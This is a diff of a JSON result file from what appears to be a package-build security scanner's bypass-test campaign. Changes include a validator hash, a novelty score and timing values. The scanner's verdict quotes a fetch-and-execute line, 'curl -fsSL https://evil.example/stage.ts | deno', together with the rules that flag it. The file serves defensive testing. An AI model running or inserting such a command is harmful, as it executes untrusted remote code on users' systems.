@@ -3,6 +3,7 @@
   "cost": {},
   "db_hash": "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
   "diff_sha256": "sha256:7b324c1cc36efe6ff9334c1f1c43c028ca3aa9ca3d6cd2ac2bbdb77effecb572",
+  "environment_ref": "campaign.yml#environment",
   "generator": {
     "directory": "campaigns/known-bypasses-manual/manual",
     "inputs": 8,
@@ -21,7 +22,7 @@
       "chain": "curl -> | deno",
       "preserved": true,
       "reason": "",
-      "validator_version": "sha256:1cf585b73235c107a8ce4c9757d7ad27636bed9d18eda3a4d33f074001b0b198"
+      "validator_version": "sha256:368bb45c32cc6123445b114f08f7e3b11774bd130049ec160f3ebbcc966b6025"
     },
     "constraints": {
       "honored": true,
@@ -34,6 +35,7 @@
     "syntax": {
       "bash_n_new": 0,
       "bash_n_old": 0,
+      "bash_path": "/usr/bin/bash",
       "reason": ""
     }
   },
@@ -114,7 +116,7 @@
           "template": ""
         },
         {
-          "description": "Source URL first seen globally (maturity=0.10) [NOVELTY]",
+          "description": "Source URL first seen globally (maturity=0.14) [NOVELTY]",
           "evidence": {},
           "file": "",
           "line": null,
@@ -269,7 +271,7 @@
           "file": "",
           "line": null,
           "params": {},
-          "reason": "Source URL first seen globally (maturity=0.10)",
+          "reason": "Source URL first seen globally (maturity=0.14)",
           "rule_id": "NOVELTY",
           "severity": "MEDIUM",
           "template": "",
@@ -277,9 +279,9 @@
         }
       ],
       "suppressed_rules": [],
-      "verdict": "This analysis was incomplete: the repository file manifest was unavailable, so only the PKGBUILD was examined. The result describes what was examined, not the whole change. Version bump. added 1 source URL(s). Signals: checksum set to SKIP [R004]; Fetch Piped Into An Unrecognised Consumer: fetch piped into deno: curl -fsSL https://evil.example/stage.ts | deno [X016]; build() fetches https://evil.example/stage.ts from outside the declared source array [R061]; Source URL classified as unknown (https://evil.example/stage.ts) [SOURCE_BUCKET]; Source URL first seen globally (maturity=0.10) [NOVELTY]; and 1 more signal(s). Review the diff before building.",
+      "verdict": "This analysis was incomplete: the repository file manifest was unavailable, so only the PKGBUILD was examined. The result describes what was examined, not the whole change. Version bump. added 1 source URL(s). Signals: checksum set to SKIP [R004]; Fetch Piped Into An Unrecognised Consumer: fetch piped into deno: curl -fsSL https://evil.example/stage.ts | deno [X016]; build() fetches https://evil.example/stage.ts from outside the declared source array [R061]; Source URL classified as unknown (https://evil.example/stage.ts) [SOURCE_BUCKET]; Source URL first seen globally (maturity=0.14) [NOVELTY]; and 1 more signal(s). Review the diff before building.",
       "version_comparison": ""
     },
-    "wall_clock_ms": 757
+    "wall_clock_ms": 756
   }
 }
